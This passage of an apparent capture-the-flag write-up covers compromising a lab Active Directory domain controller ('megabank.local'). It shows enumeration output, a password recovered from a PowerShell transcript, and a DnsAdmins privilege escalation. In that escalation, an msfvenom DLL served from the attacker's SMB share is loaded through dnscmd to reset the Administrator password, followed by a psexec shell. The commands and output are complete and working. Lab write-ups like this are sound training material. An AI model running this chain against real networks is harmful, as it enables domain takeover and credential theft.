                        CN=Domain Admins,CN=Users,DC=megabank,DC=local,
                        CN=Cert Publishers,CN=Users,DC=megabank,DC=local,
                        CN=Enterprise Admins,CN=Users,DC=megabank,DC=local,
                        CN=Schema Admins,CN=Users,DC=megabank,DC=local,
                        CN=Domain Controllers,CN=Users,DC=megabank,DC=local,
                        CN=krbtgt,CN=Users,DC=megabank,DC=local
name:                   Denied RODC Password Replication Group
objectcategory:         CN=Group,CN=Schema,CN=Configuration,DC=megabank,DC=local
objectclass:            top,
                        group
objectguid:             f756e296-e3be-40bc-b'b70e'-7a4a69916e21
objectsid:              S-1-5-21-1392959593-3013219662-3596683436-572
samaccountname:         Denied RODC Password Replication Group
samaccounttype:         536870912
usnchanged:             12433
usncreated:             12405
whenchanged:            2019-09-25 13:29:12
whencreated:            2019-09-25 13:29:12

admincount:             1
cn:                     Read-only Domain Controllers
description:            Members of this group are Read-Only Domain Controllers in the domain
distinguishedname:      CN=Read-only Domain Controllers,CN=Users,DC=megabank,DC=local
dscorepropagationdata:  2019-09-27 22:10:48,
                        2019-09-27 10:52:19,
                        2019-09-25 13:44:22,
                        2019-09-25 13:29:12,
                        1601-07-14 04:20:16
grouptype:              -2147483646
instancetype:           4
iscriticalsystemobject: TRUE
isgroup:                True
memberof:               CN=Denied RODC Password Replication Group,CN=Users,DC=megabank,DC=local
name:                   Read-only Domain Controllers
objectcategory:         CN=Group,CN=Schema,CN=Configuration,DC=megabank,DC=local
objectclass:            top,
                        group
objectguid:             97d3fca2-e50d-46fa-b'991d'-121a7341d9cb
objectsid:              S-1-5-21-1392959593-3013219662-3596683436-521
samaccountname:         Read-only Domain Controllers
samaccounttype:         268435456
usnchanged:             12779
usncreated:             12419
whenchanged:            2019-09-25 13:44:22
whencreated:            2019-09-25 13:29:12

cn:                     Enterprise Read-only Domain Controllers
description:            Members of this group are Read-Only Domain Controllers in the enterprise
distinguishedname:      CN=Enterprise Read-only Domain Controllers,CN=Users,DC=megabank,DC=local
dscorepropagationdata:  2019-09-27 22:10:48,
                        2019-09-27 10:52:19,
                        2019-09-25 13:29:12,
                        1601-01-01 18:16:33
grouptype:              -2147483640
instancetype:           4
iscriticalsystemobject: TRUE
isgroup:                True
name:                   Enterprise Read-only Domain Controllers
objectcategory:         CN=Group,CN=Schema,CN=Configuration,DC=megabank,DC=local
objectclass:            top,
                        group
objectguid:             63ec94ab-89d6-468d-b'a875'-6fa378da661e
objectsid:              S-1-5-21-1392959593-3013219662-3596683436-498
samaccountname:         Enterprise Read-only Domain Controllers
samaccounttype:         268435456
usnchanged:             12431
usncreated:             12429
whenchanged:            2019-09-25 13:29:12
whencreated:            2019-09-25 13:29:12

cn:                     Cloneable Domain Controllers
description:            Members of this group that are domain controllers may be cloned.
distinguishedname:      CN=Cloneable Domain Controllers,CN=Users,DC=megabank,DC=local
dscorepropagationdata:  2019-09-27 22:10:48,
                        2019-09-27 10:52:19,
                        2019-09-25 13:29:12,
                        1601-01-01 18:16:33
grouptype:              -2147483646
instancetype:           4
iscriticalsystemobject: TRUE
isgroup:                True
name:                   Cloneable Domain Controllers
objectcategory:         CN=Group,CN=Schema,CN=Configuration,DC=megabank,DC=local
objectclass:            top,
                        group
objectguid:             e1533145-99aa-415f-b'b10b'-ae625d180a6f
objectsid:              S-1-5-21-1392959593-3013219662-3596683436-522
samaccountname:         Cloneable Domain Controllers
samaccounttype:         268435456
usnchanged:             12442
usncreated:             12440
whenchanged:            2019-09-25 13:29:12
whencreated:            2019-09-25 13:29:12

cn:                     Protected Users
description:            Members of this group are afforded additional protections against authentication security threats. See http://go.microsoft.com/fwlink/?LinkId=298939 for more information.
distinguishedname:      CN=Protected Users,CN=Users,DC=megabank,DC=local
dscorepropagationdata:  2019-09-27 22:10:48,
                        2019-09-27 10:52:19,
                        2019-09-25 13:29:12,
                        1601-01-01 18:16:33
grouptype:              -2147483646
instancetype:           4
iscriticalsystemobject: TRUE
isgroup:                True
name:                   Protected Users
objectcategory:         CN=Group,CN=Schema,CN=Configuration,DC=megabank,DC=local
objectclass:            top,
                        group
objectguid:             5e947857-0dc0-4131-b'ae15'-27dceb9a920b
objectsid:              S-1-5-21-1392959593-3013219662-3596683436-525
samaccountname:         Protected Users
samaccounttype:         268435456
usnchanged:             12447
usncreated:             12445
whenchanged:            2019-09-25 13:29:12
whencreated:            2019-09-25 13:29:12

cn:                     Key Admins
description:            Members of this group can perform administrative actions on key objects within the domain.
distinguishedname:      CN=Key Admins,CN=Users,DC=megabank,DC=local
dscorepropagationdata:  2019-09-27 22:10:48,
                        2019-09-27 10:52:19,
                        2019-09-25 13:29:12,
                        1601-01-01 18:16:33
grouptype:              -2147483646
instancetype:           4
iscriticalsystemobject: TRUE
isgroup:                True
name:                   Key Admins
objectcategory:         CN=Group,CN=Schema,CN=Configuration,DC=megabank,DC=local
objectclass:            top,
                        group
objectguid:             b8cb4269-4289-4663-b'972b'-d4b51d2464d9
objectsid:              S-1-5-21-1392959593-3013219662-3596683436-526
samaccountname:         Key Admins
samaccounttype:         268435456
usnchanged:             12452
usncreated:             12450
whenchanged:            2019-09-25 13:29:12
whencreated:            2019-09-25 13:29:12

cn:                     Enterprise Key Admins
description:            Members of this group can perform administrative actions on key objects within the forest.
distinguishedname:      CN=Enterprise Key Admins,CN=Users,DC=megabank,DC=local
dscorepropagationdata:  2019-09-27 22:10:48,
                        2019-09-27 10:52:19,
                        2019-09-25 13:29:12,
                        1601-01-01 18:16:33
grouptype:              -2147483640
instancetype:           4
iscriticalsystemobject: TRUE
isgroup:                True
name:                   Enterprise Key Admins
objectcategory:         CN=Group,CN=Schema,CN=Configuration,DC=megabank,DC=local
objectclass:            top,
                        group
objectguid:             72cbd521-f5bf-401f-b'bc60'-9547087486dc
objectsid:              S-1-5-21-1392959593-3013219662-3596683436-527
samaccountname:         Enterprise Key Admins
samaccounttype:         268435456
usnchanged:             12455
usncreated:             12453
whenchanged:            2019-09-25 13:29:12
whencreated:            2019-09-25 13:29:12

cn:                    DnsAdmins
description:           DNS Administrators Group
distinguishedname:     CN=DnsAdmins,CN=Users,DC=megabank,DC=local
dscorepropagationdata: 2019-09-27 22:10:48,
                       2019-09-27 10:52:19,
                       1601-01-01 00:04:17
grouptype:             -2147483644
instancetype:          4
isgroup:               True
member:                CN=Contractors,OU=Groups,DC=megabank,DC=local
name:                  DnsAdmins
objectcategory:        CN=Group,CN=Schema,CN=Configuration,DC=megabank,DC=local
objectclass:           top,
                       group
objectguid:            84a33325-b8f7-4ea8-b'9668'-a5ea4d964b3c
objectsid:             S-1-5-21-1392959593-3013219662-3596683436-1101
samaccountname:        DnsAdmins
samaccounttype:        536870912
usnchanged:            12891
usncreated:            12483
whenchanged:           2019-09-26 12:39:25
whencreated:           2019-09-25 13:29:51

cn:                    DnsUpdateProxy
description:           DNS clients who are permitted to perform dynamic updates on behalf of some other clients (such as DHCP servers).
distinguishedname:     CN=DnsUpdateProxy,CN=Users,DC=megabank,DC=local
dscorepropagationdata: 2019-09-27 22:10:48,
                       2019-09-27 10:52:19,
                       1601-01-01 00:04:17
grouptype:             -2147483646
instancetype:          4
isgroup:               True
name:                  DnsUpdateProxy
objectcategory:        CN=Group,CN=Schema,CN=Configuration,DC=megabank,DC=local
objectclass:           top,
                       group
objectguid:            e6cf45b2-84e4-40c1-b'9691'-9fc782bc6184
objectsid:             S-1-5-21-1392959593-3013219662-3596683436-1102
samaccountname:        DnsUpdateProxy
samaccounttype:        268435456
usnchanged:            12488
usncreated:            12488
whenchanged:           2019-09-25 13:29:51
whencreated:           2019-09-25 13:29:51

cn:                    Contractors
description:           Contractors
displayname:           Contractors
distinguishedname:     CN=Contractors,OU=Groups,DC=megabank,DC=local
dscorepropagationdata: 2019-09-27 22:10:48,
                       2019-09-27 10:52:18,
                       1601-01-01 00:04:17
grouptype:             -2147483646
instancetype:          4
isgroup:               True
member:                CN=Ryan Bertrand,OU=Contractors,OU=MegaBank Users,DC=megabank,DC=local
memberof:              CN=DnsAdmins,CN=Users,DC=megabank,DC=local,
                       CN=Remote Management Users,CN=Builtin,DC=megabank,DC=local
name:                  Contractors
objectcategory:        CN=Group,CN=Schema,CN=Configuration,DC=megabank,DC=local
objectclass:           top,
                       group
objectguid:            9f2ff7be-f805-491f-b'aff1'-3653653874d7
objectsid:             S-1-5-21-1392959593-3013219662-3596683436-1103
samaccountname:        Contractors
samaccounttype:        268435456
usnchanged:            16397
usncreated:            12887
whenchanged:           2019-09-27 14:02:21
whencreated:           2019-09-26 12:37:45
```


As noted during LDAP enumeration, `Contractors` is the only non-standard group. `megabank.local\ryan` is the only member of this group. This group is also in the `DnsAdmins` and `Remote Management Users` group. `megabank.local\ryan`'s password is also set to never expire.

### Domain Computers

```bash
$ pywerview get-netcomputer -w megabank.local -u melanie -p 'Welcome123!' --dc-ip 10.129.251.7 --full-data
accountexpires:                9223372036854775807
badpasswordtime:               1600-12-31 19:03:58
badpwdcount:                   0
cn:                            RESOLUTE
codepage:                      0
countrycode:                   0
displayname:                   RESOLUTE$
distinguishedname:             CN=RESOLUTE,OU=Domain Controllers,DC=megabank,DC=local
dnshostname:                   Resolute.megabank.local
dscorepropagationdata:         2019-09-27 22:10:48,
                               2019-09-27 10:52:18,
                               2019-09-25 13:29:12,
                               1601-01-01 18:16:33
instancetype:                  4
iscriticalsystemobject:        TRUE
isgroup:                       False
lastlogoff:                    1600-12-31 19:03:58
lastlogon:                     2021-11-07 00:08:06.834224
lastlogontimestamp:            132807314132554811
localpolicyflags:              0
logoncount:                    102
msdfsr-computerreferencebl:    CN=DC,CN=Topology,CN=Domain System Volume,CN=DFSR-GlobalSettings,CN=System,DC=megabank,DC=local
msds-generationid:             245,
                               76,
                               90,
                               21,
                               212,
                               178,
                               114,
                               187
msds-supportedencryptiontypes: 28
name:                          RESOLUTE
objectcategory:                CN=Computer,CN=Schema,CN=Configuration,DC=megabank,DC=local
objectclass:                   top,
                               person,
                               organizationalPerson,
                               user,
                               computer
objectguid:                    3cf00402-4706-48aa-b'8f00'-d407dd13ac95
objectsid:                     S-1-5-21-1392959593-3013219662-3596683436-1000
operatingsystem:               Windows Server 2016 Standard
operatingsystemversion:        10.0 (14393)
primarygroupid:                516
pwdlastset:                    2021-11-07 00:03:18.403714
ridsetreferences:              CN=RID Set,CN=RESOLUTE,OU=Domain Controllers,DC=megabank,DC=local
samaccountname:                RESOLUTE$
samaccounttype:                805306369
serverreferencebl:             CN=RESOLUTE,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=megabank,DC=local
serviceprincipalname:          Dfsr-12F9A27C-BF97-4787-9364-D31B6C55EB04/Resolute.megabank.local,
                               ldap/Resolute.megabank.local/ForestDnsZones.megabank.local,
                               ldap/Resolute.megabank.local/DomainDnsZones.megabank.local,
                               DNS/Resolute.megabank.local,
                               GC/Resolute.megabank.local/megabank.local,
                               HOST/Resolute.megabank.local/MEGABANK,
                               HOST/Resolute.megabank.local/megabank.local,
                               ldap/Resolute.megabank.local/MEGABANK,
                               ldap/Resolute.megabank.local,
                               ldap/Resolute.megabank.local/megabank.local,
                               RestrictedKrbHost/Resolute.megabank.local,
                               HOST/Resolute.megabank.local,
                               RestrictedKrbHost/RESOLUTE,
                               HOST/RESOLUTE/MEGABANK,
                               HOST/RESOLUTE,
                               ldap/RESOLUTE/MEGABANK,
                               ldap/RESOLUTE,
                               RPC/b9024923-44e7-4b82-83d5-7e0d199af2bc._msdcs.megabank.local,
                               E3514235-4B06-11D1-AB04-00C04FC2DCD2/b9024923-44e7-4b82-83d5-7e0d199af2bc/megabank.local,
                               ldap/b9024923-44e7-4b82-83d5-7e0d199af2bc._msdcs.megabank.local
useraccountcontrol:            ['SERVER_TRUST_ACCOUNT', 'TRUSTED_FOR_DELEGATION']
usnchanged:                    159798
usncreated:                    12293
whenchanged:                   2021-11-07 04:03:33
whencreated:                   2019-09-25 13:29:11

accountexpires:                9223372036854775807
badpasswordtime:               1600-12-31 19:03:58
badpwdcount:                   0
cn:                            MS02
codepage:                      0
countrycode:                   0
distinguishedname:             CN=MS02,CN=Computers,DC=megabank,DC=local
dnshostname:                   MS02.megabank.local
dscorepropagationdata:         2019-09-27 22:10:48,
                               2019-09-27 10:52:18,
                               1601-01-01 00:04:17
instancetype:                  4
iscriticalsystemobject:        FALSE
isgroup:                       False
lastlogoff:                    1600-12-31 19:03:58
lastlogon:                     2019-09-28 19:00:12.674081
lastlogontimestamp:            132140541083313104
localpolicyflags:              0
logoncount:                    8
msds-supportedencryptiontypes: 28
name:                          MS02
objectcategory:                CN=Computer,CN=Schema,CN=Configuration,DC=megabank,DC=local
objectclass:                   top,
                               person,
                               organizationalPerson,
                               user,
                               computer
objectguid:                    652a4711-637f-45f3-b'a255'-70d46cc42eb3
objectsid:                     S-1-5-21-1392959593-3013219662-3596683436-1104
operatingsystem:               Windows Server 2016 Standard
operatingsystemversion:        10.0 (14393)
primarygroupid:                515
pwdlastset:                    2019-09-27 06:33:55.846798
samaccountname:                MS02$
samaccounttype:                805306369
serviceprincipalname:          RestrictedKrbHost/MS02,
                               HOST/MS02,
                               RestrictedKrbHost/MS02.megabank.local,
                               HOST/MS02.megabank.local
useraccountcontrol:            ['WORKSTATION_TRUST_ACCOUNT']
usnchanged:                    12993
usncreated:                    12985
whenchanged:                   2019-09-27 10:35:08
whencreated:                   2019-09-27 10:33:55
```

Nothing really new here compared to the original LDAP enumeration.

### Domain Graph

Graph the domain using BloodHound.

```bash
$ bloodhound-python -d megabank.local -u melanie -p 'Welcome123!' -c All -ns 10.129.251.7
INFO: Found AD domain: megabank.local
INFO: Connecting to LDAP server: Resolute.megabank.local
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 2 computers
INFO: Connecting to LDAP server: Resolute.megabank.local
INFO: Found 27 users
INFO: Found 53 groups
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: MS02.megabank.local
INFO: Querying computer: Resolute.megabank.local
INFO: Done in 00M 10S
```

After analyzing the resultant graphs from the prebuilt analytic queries, the following graph appears to be the most significant.

![](images/Pasted%20image%2020211107003620.png)

It appears that both `melanie` and `ryan` have `CanPSRemote` privileges to the domain controller. The way forward must be through local privilege escalation.

---

## Lateral Movement

Running winPEAS doesn't reveal anything of significant interest.

Enumerating the various registry keys that indicate the presence of any PowerShell transcript logging reveals PowerShell commands are being logged to `C:\PSTranscripts`, a non-standard directory.

```powershell
*Evil-WinRM* PS C:\Users\melanie\Documents> reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription

HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\Transcription
    EnableTranscripting    REG_DWORD    0x0
    OutputDirectory    REG_SZ    C:\PSTranscipts
    EnableInvocationHeader    REG_DWORD    0x0
```

Exploring this directory reveals a transcript file `C:\PSTranscripts\20191203\PowerShell_transcript.RESOLUTE.OJuoBGhU.20191203063201.txt`.

```powershell
*Evil-WinRM* PS C:\PSTranscripts\20191203> cat PowerShell_transcript.RESOLUTE.OJuoBGhU.20191203063201.txt
**********************
Windows PowerShell transcript start
Start time: 20191203063201
Username: MEGABANK\ryan
RunAs User: MEGABANK\ryan
Machine: RESOLUTE (Microsoft Windows NT 10.0.14393.0)
Host Application: C:\Windows\system32\wsmprovhost.exe -Embedding
Process ID: 2800
PSVersion: 5.1.14393.2273
PSEdition: Desktop
PSCompatibleVersions: 1.0, 2.0, 3.0, 4.0, 5.0, 5.1.14393.2273
BuildVersion: 10.0.14393.2273
CLRVersion: 4.0.30319.42000
WSManStackVersion: 3.0
PSRemotingProtocolVersion: 2.3
SerializationVersion: 1.1.0.1
**********************
Command start time: 20191203063455
**********************
PS>TerminatingError(): "System error."
>> CommandInvocation(Invoke-Expression): "Invoke-Expression"
>> ParameterBinding(Invoke-Expression): name="Command"; value="-join($id,'PS ',$(whoami),'@',$env:computername,' ',$((gi $pwd).Name),'> ')
if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
>> CommandInvocation(Out-String): "Out-String"
>> ParameterBinding(Out-String): name="Stream"; value="True"
**********************
Command start time: 20191203063455
**********************
PS>ParameterBinding(Out-String): name="InputObject"; value="PS megabank\ryan@RESOLUTE Documents> "
PS megabank\ryan@RESOLUTE Documents>
**********************
Command start time: 20191203063515
**********************
PS>CommandInvocation(Invoke-Expression): "Invoke-Expression"
>> ParameterBinding(Invoke-Expression): name="Command"; value="cmd /c net use X: \\fs01\backups ryan Serv3r4Admin4cc123!

if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
>> CommandInvocation(Out-String): "Out-String"
>> ParameterBinding(Out-String): name="Stream"; value="True"
**********************
Windows PowerShell transcript start
Start time: 20191203063515
Username: MEGABANK\ryan
RunAs User: MEGABANK\ryan
Machine: RESOLUTE (Microsoft Windows NT 10.0.14393.0)
Host Application: C:\Windows\system32\wsmprovhost.exe -Embedding
Process ID: 2800
PSVersion: 5.1.14393.2273
PSEdition: Desktop
PSCompatibleVersions: 1.0, 2.0, 3.0, 4.0, 5.0, 5.1.14393.2273
BuildVersion: 10.0.14393.2273
CLRVersion: 4.0.30319.42000
WSManStackVersion: 3.0
PSRemotingProtocolVersion: 2.3
SerializationVersion: 1.1.0.1
**********************
**********************
Command start time: 20191203063515
**********************
PS>CommandInvocation(Out-String): "Out-String"
>> ParameterBinding(Out-String): name="InputObject"; value="The syntax of this command is:"
cmd : The syntax of this command is:
At line:1 char:1
+ cmd /c net use X: \\fs01\backups ryan Serv3r4Admin4cc123!
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : NotSpecified: (The syntax of this command is::String) [], RemoteException
    + FullyQualifiedErrorId : NativeCommandError
cmd : The syntax of this command is:
At line:1 char:1
+ cmd /c net use X: \\fs01\backups ryan Serv3r4Admin4cc123!
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : NotSpecified: (The syntax of this command is::String) [], RemoteException
    + FullyQualifiedErrorId : NativeCommandError
**********************
Windows PowerShell transcript start
Start time: 20191203063515
Username: MEGABANK\ryan
RunAs User: MEGABANK\ryan
Machine: RESOLUTE (Microsoft Windows NT 10.0.14393.0)
Host Application: C:\Windows\system32\wsmprovhost.exe -Embedding
Process ID: 2800
PSVersion: 5.1.14393.2273
PSEdition: Desktop
PSCompatibleVersions: 1.0, 2.0, 3.0, 4.0, 5.0, 5.1.14393.2273
BuildVersion: 10.0.14393.2273
CLRVersion: 4.0.30319.42000
WSManStackVersion: 3.0
PSRemotingProtocolVersion: 2.3
SerializationVersion: 1.1.0.1
**********************
```

The transcript shows the user `ryan` attempting to mount a file share. It reveals his password: `Serv3r4Admin4cc123!`.

---

## Privilege Escalation

Prior BloodHound enumeration revealed that `megabank.local\ryan` has `CanPSRemote` access to the domain controller. WinRM into it using his credentials.

`ryan` has a note on his desktop.

```powershell
*Evil-WinRM* PS C:\Users\ryan\Desktop> cat note.txt
Email to team:

- due to change freeze, any system changes (apart from those to the administrator account) will be automatically reverted within 1 minute
```

Something to keep in mind.

Look at `ryan`'s groups.

```powershell
*Evil-WinRM* PS C:\Users\ryan\Documents> whoami /groups

GROUP INFORMATION
-----------------

Group Name                                 Type             SID                                            Attributes
========================================== ================ ============================================== ===============================================================
Everyone                                   Well-known group S-1-1-0                                        Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                              Alias            S-1-5-32-545                                   Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554                                   Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users            Alias            S-1-5-32-580                                   Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                       Well-known group S-1-5-2                                        Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11                                       Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization             Well-known group S-1-5-15                                       Mandatory group, Enabled by default, Enabled group
MEGABANK\Contractors                       Group            S-1-5-21-1392959593-3013219662-3596683436-1103 Mandatory group, Enabled by default, Enabled group
MEGABANK\DnsAdmins                         Alias            S-1-5-21-1392959593-3013219662-3596683436-1101 Mandatory group, Enabled by default, Enabled group, Local Group
NT AUTHORITY\NTLM Authentication           Well-known group S-1-5-64-10                                    Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Mandatory Level     Label            S-1-16-8192
```

It appears that `ryan` is a part of the `DnsAdmins` group. According to [Shay Ber's bug report](https://medium.com/@esnesenon/feature-not-bug-dnsadmin-to-dc-compromise-in-one-line-a0f779b8dc83), there exist functionality in Windows's DNS server implementation that allows members of the `DnsAdmins` group (or any user that has write access to the DNS server object) to specify a particular DLL to be executed as `NT AUTHORITY/SYSTEM` whenever the DNS server takes certain actions, such as restarting. By creating a malicious DLL that exports the correct functions, configuring the DNS server to run the DLL on restart, and then restarting the DNS server, it is possible to elevate privileges.

Generate a DLL that changes the domain administrator's password.

```bash
$ msfvenom -p windows/x64/exec cmd='net user Administrator P@ssword123! /domain' -f dll > tgihf.dll
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 311 bytes
Final size of dll file: 8704 bytes
```

Start an SMB share on the attacker's machine to serve the DLL.

```bash
$ impacket-smbshare . tgihf -smb2support
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
```

In a shell on the target as `ryan`, configure the DNS server to execute the DLL on startup.

```powershell
*Evil-WinRM* PS C:\Users\ryan\Desktop> dnscmd resolute.megabank.local /config /serverlevelplugindll \\10.10.14.58\tgihf\tgihf.dll
Registry property serverlevelplugindll successfully reset.
Command completed successfully.
```

Restart the DNS service.

```powershell
*Evil-WinRM* PS C:\Users\ryan\Desktop> sc.exe \\resolute.megabank.local stop dns

SERVICE_NAME: dns
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 3  STOP_PENDING
                                (STOPPABLE, PAUSABLE, ACCEPTS_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0
*Evil-WinRM* PS C:\Users\ryan\Desktop> sc.exe \\resolute.megabank.local start dns

SERVICE_NAME: dns
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 2  START_PENDING
                                (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x7d0
        PID                : 4044
        FLAGS              :
```

A hit on the SMB server indicates the domain controller did reach out for the DLL. Access the domain control with the new doman administrator's password and read the root flag.

```bash
$ impacket-psexec megabank.local/Administrator:'P@ssword123!'@10.129.251.57 -dc-ip 10.129.251.57
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] Requesting shares on 10.129.251.57.....
[*] Found writable share ADMIN$
[*] Uploading file fedQuCpU.exe
[*] Opening SVCManager on 10.129.251.57.....
[*] Creating service iZQi on 10.129.251.57.....
[*] Starting service iZQi.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\system32>dir C:\Users\Administrator\Desktop\root.txt
 Volume in drive C has no label.
 Volume Serial Number is 923F-3611

 Directory of C:\Users\Administrator\Desktop

12/03/2019  07:32 AM                32 root.txt
               1 File(s)             32 bytes
               0 Dir(s)  31,727,251,456 bytes free
```
